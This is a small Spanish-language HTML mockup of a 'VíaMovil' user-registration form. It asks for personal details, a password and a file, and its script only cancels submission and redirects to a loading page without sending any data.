
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Formulario VíaMovil</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      padding: 20px;
      margin: 0;
    }
    .container {
      max-width: 500px;
      margin: auto;
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    img {
      width: 80px;
    }
    h2 {
      color: #d90000;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      background-color: #d90000;
      color: white;
      border: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="viamovil_logo.png" alt="Logo VíaMovil" />
    <h2>Registro de Usuario</h2>
    <form onsubmit="mostrarCargando(event)">
      <input type="text" placeholder="Nombre completo" required />
      <input type="text" placeholder="Ciudad de residencia" required />
      <input type="text" placeholder="Identificación" required />
      <input type="text" placeholder="Dirección de residencia" required />
      <input type="email" placeholder="Correo electrónico" required />
      <input type="password" placeholder="Contraseña" required />
      <input type="password" placeholder="Confirmar contraseña" required />
      <input type="file" required />
      <button type="submit">Enviar datos</button>
    </form>
  </div>
  <script>
    function mostrarCargando(e) {
      e.preventDefault();
      window.location.href = "cargando.html";
    }
  </script>
</body>
</html>
